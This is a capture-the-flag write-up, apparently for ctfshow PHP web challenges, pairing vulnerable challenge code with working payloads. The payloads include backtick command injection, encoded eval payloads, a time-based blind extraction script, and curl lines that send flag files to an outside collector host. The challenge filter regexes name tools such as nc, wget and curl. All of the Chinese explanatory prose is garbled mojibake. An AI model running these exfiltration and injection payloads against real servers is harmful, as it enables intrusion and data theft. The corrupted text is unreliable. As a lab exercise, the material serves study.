<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getä¼ å‚   F=`$F `;sleep 3</span><br><span class="line">ç»è¿‡substr($F,0,6)æˆªå–å å¾—åˆ°  `$F `;</span><br><span class="line">ä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œ eval(&quot;`$F `;&quot;);</span><br><span class="line">æˆ‘ä»¬æŠŠåŸæ¥çš„$Få¸¦è¿›å»</span><br><span class="line">eval(&quot;``$F `;sleep 3`&quot;);</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆä¼šæ‰§è¡Œ  `   `$F `;sleep 3  ` == shell_exec(&quot;`$F `;sleep 3&quot;);</span><br><span class="line">å‰é¢çš„å‘½ä»¤æˆ‘ä»¬ä¸éœ€è¦ç®¡ï¼Œä½†æ˜¯åé¢çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥è‡ªç”±æ§åˆ¶ã€‚</span><br><span class="line">è¿™æ ·å°±åœ¨æœåŠ¡å™¨ä¸ŠæˆåŠŸæ‰§è¡Œäº† sleep 3</span><br><span class="line">æ‰€ä»¥ æœ€åå°±æ˜¯ä¸€é“æ— å›æ˜¾çš„RCEé¢˜ç›®äº†</span><br></pre></td></tr></table></figure>

<p>æ— å›æ˜¾æˆ‘ä»¬å¯ä»¥ç”¨åå¼¹shell æˆ–è€…curlå¤–å¸¦ æˆ–è€…ç›²æ³¨<br> è¿™é‡Œçš„è¯åå¼¹æ²¡æœ‰æˆåŠŸï¼Œä½†æ˜¯å¯ä»¥å¤–å¸¦ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  http://xxx:4567?p=`tac f*`</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶è¦æ˜¯æ²¡æœ‰å…¬ç½‘ipçš„è¯ï¼Œbpä¹Ÿå¯ä»¥å¸®åˆ°æˆ‘ä»¬è¿™ä¸ªå¿™</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?F=`$F` ;curl -X post -F xx=@flag.php http://zadcth92f5pgqbtmchfdumhi49a0yp.burpcollaborator.net;</span><br></pre></td></tr></table></figure>



<h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$key1 = 0;</span><br><span class="line">$key2 = 0;</span><br><span class="line">if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;</span><br><span class="line">    die(&quot;nonononono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">extract($_POST);</span><br><span class="line">if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;</span><br><span class="line">    die(file_get_contents(&#x27;flag.php&#x27;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨<code>extract</code>è¿›è¡Œå˜é‡è¦†ç›–</p>
<p>æµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">var_dump($_POST);</span><br><span class="line">//ç„¶åæˆ‘ä»¬ä¼ å…¥ _POST[â€˜aâ€™]=123</span><br><span class="line">ä¼šå‘ç°è¾“å‡ºçš„ç»“æœä¸ºarray(1) &#123; [&quot;â€˜aâ€™&quot;]=&gt; string(3) â€œ123â€ &#125;</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´ç°åœ¨çš„$_POST[â€˜aâ€™]å­˜åœ¨å¹¶ä¸”å€¼ä¸º123</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure>



<h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flag.php</span><br><span class="line">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class="line">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;</span><br><span class="line">        eval(substr($F,0,6));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F` ;cp flag.php 2.txt;</span><br><span class="line">?F=`$F` ;uniq flag.php&gt;4.txt;</span><br></pre></td></tr></table></figure>



<h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function check($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>è™½ç„¶è¿‡æ»¤äº†å¾ˆå¤šï¼Œä½†æ˜¯åœ¨linuxä¸­æˆ‘ä»¬å¯ä»¥ç”¨teeå†™æ–‡ä»¶</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls|tee 1.txt</span><br><span class="line">ls / |tee 1.txt</span><br><span class="line">cat /f* |1.txt</span><br></pre></td></tr></table></figure>



<h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]); </span><br></pre></td></tr></table></figure>

<p>å¾ˆç®€å•ï¼Œç›´æ¥è°ƒç”¨ctfshowç±»é‡Œçš„getFlagæ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST:ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<p>å€Ÿç”¨yu22xå¸ˆå‚…çš„æ‹“å±•</p>
<blockquote>
<p>phpä¸­ -&gt;ä¸:: è°ƒç”¨ç±»ä¸­çš„æˆå‘˜çš„åŒºåˆ«<br>-&gt;ç”¨äºåŠ¨æ€è¯­å¢ƒå¤„ç†æŸä¸ªç±»çš„æŸä¸ªå®ä¾‹<br>::å¯ä»¥è°ƒç”¨ä¸€ä¸ªé™æ€çš„ã€ä¸ä¾èµ–äºå…¶ä»–åˆå§‹åŒ–çš„ç±»æ–¹æ³•.</p>
<p><strong>ä¹Ÿå°±æ˜¯è¯´åŒå†’å·å¯ä»¥ä¸ç”¨å®ä¾‹åŒ–ç±»å°±å¯ä»¥ç›´æ¥è°ƒç”¨ç±»ä¸­çš„æ–¹æ³•</strong></p>
</blockquote>
<h3 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;</span><br><span class="line">    die(&quot;private function&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br></pre></td></tr></table></figure>

<p>ç›¸æ¯”äºä¸Šä¸€é¢˜ï¼Œè¿™ä¸ªé¢˜è¿‡æ»¤äº†å†’å·</p>
<p>call_user_funcä¸­ä¸ä½†å¯ä»¥ä¼ å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥ä¼ æ•°ç»„</p>
<p>æœ¬åœ°æµ‹è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class="line">è¿™æ—¶å€™ä¼šè°ƒç”¨ classnameä¸­çš„ say_helloæ–¹æ³•</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>



<h3 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function check($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>åªèƒ½ç›²æ‰“å’¯</p>
<p>è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line">str=string.digits+string.ascii_lowercase+&quot;-&quot;</span><br><span class="line">result=&quot;&quot;</span><br><span class="line">key=0</span><br><span class="line">for j in range(1,45):</span><br><span class="line">    print(j)</span><br><span class="line">    if key==1:</span><br><span class="line">        break</span><br><span class="line">    for n in str:</span><br><span class="line">        payload=&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)</span><br><span class="line">        #print(payload)</span><br><span class="line">        url=&quot;http://47f5a8e0-42e2-4260-9f27-ec8d922b6561.challenge.ctf.show/?c=&quot;+payload</span><br><span class="line">        try:</span><br><span class="line">            requests.get(url,timeout=(2.5,2.5))</span><br><span class="line">        except:</span><br><span class="line">            result=result+n</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123;</span><br><span class="line">    $f1 = (String)$_POST[&#x27;f1&#x27;];</span><br><span class="line">    $f2 = (String)$_POST[&#x27;f2&#x27;];</span><br><span class="line">    if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123;</span><br><span class="line">        if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123;</span><br><span class="line">            $code = eval(&quot;return $f1($f2());&quot;);</span><br><span class="line">            if(intval($code) == &#x27;ctfshow&#x27;)&#123;</span><br><span class="line">                echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(intval($code) == &#x27;ctfshow&#x27;)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿›è¡Œçš„æ˜¯å¼±æ¯”è¾ƒ,å¯ä»¥ç”¨nullç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$code = eval(&quot;return $f1($f2());&quot;); </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval(&#x27;a&#x27;)==0 intval(&#x27;.&#x27;)==0 intval(&#x27;/&#x27;)==0</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5())</span><br><span class="line">current(localeconv)</span><br><span class="line">sha1(getcwd())     å› ä¸º/var/www/html md5åå¼€å¤´çš„æ•°å­—æ‰€ä»¥æˆ‘ä»¬æ”¹ç”¨sha1</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šä¹±å¼„ä¸€äº›å‡½æ•°éƒ½å¯ä»¥ï¼Œæœ€åå¾—åˆ°çš„ç»“æœæ˜¯nullåŒæ ·ç¬¦åˆæ¡ä»¶</p>
<h3 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line"></span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/^\W+$/&#x27;, $v3))&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><code>/^\W+$/</code> ä½œç”¨æ˜¯åŒ¹é…éæ•°å­—å­—æ¯ä¸‹åˆ’çº¿çš„å­—ç¬¦,</p>
<p>çœ‹çœ‹ä¸‹é¢è¿™å¥è¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;return 1;phpinfo();&quot;);</span><br></pre></td></tr></table></figure>

<p>æ˜¾ç„¶è¿™é‡Œçš„<code>phpinfo()</code>æ˜¯ä¸æ‰§è¡Œçš„ï¼Œä½†æ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ <code>1-phpinfo();</code>æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()å‘½ä»¤çš„ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;return 1-phpinfo();&quot;);//å¯ä»¥æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure>



<h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    if(is_numeric($v1))&#123;</span><br><span class="line">        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);</span><br><span class="line">        sleep($d);</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬ä»¤<code>v1=0</code>å°±å¯ä»¥è®©<code>$d=0</code></p>
<h3 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;, $v3))&#123;</span><br><span class="line">                die(&#x27;get out hacker!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†åŠ å‡ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¹˜é™¤ï¼Œè¿‡æ»¤äº†å–åæˆ‘ä»¬å¯ä»¥ç”¨å¼‚æˆ–</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2=1</span><br></pre></td></tr></table></figure>



<h3 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line"></span><br><span class="line">    if(is_numeric($v1) &amp;&amp; check($v3))&#123;</span><br><span class="line">        if(preg_match(&#x27;/^\W+$/&#x27;, $v2))&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check($str)&#123;</span><br><span class="line">    return strlen($str)===1?true:false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸å‰é¢å‡ ä¸ªé¢˜ç±»ä¼¼ï¼Œå°†v1,v2,v3ä¸‰ä¸ªé¡ºåºé‡æ–°è°ƒä¸€ä¸‹å°±å¥½äº†</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v3=-&amp;v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)</span><br></pre></td></tr></table></figure>



<h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;, $v3))&#123;</span><br><span class="line">                die(&#x27;get out hacker!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹äº†yu22xå¸ˆå‚…çš„wpï¼Œå¦™ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;return 1?phpinfo():1;&quot;);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè€ƒå¯Ÿäº†ä¸‰ç›®è¿ç®—ç¬¦ï¼Œè¿™é‡Œæ˜¯å¯ä»¥æ‰§è¡Œphpinfo()çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v3=?(~%8F%97%8F%96%91%99%90)():&amp;v2=1</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å¯ä»¥æ‰§è¡Œphpinfo()</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&amp;v2=1</span><br></pre></td></tr></table></figure>



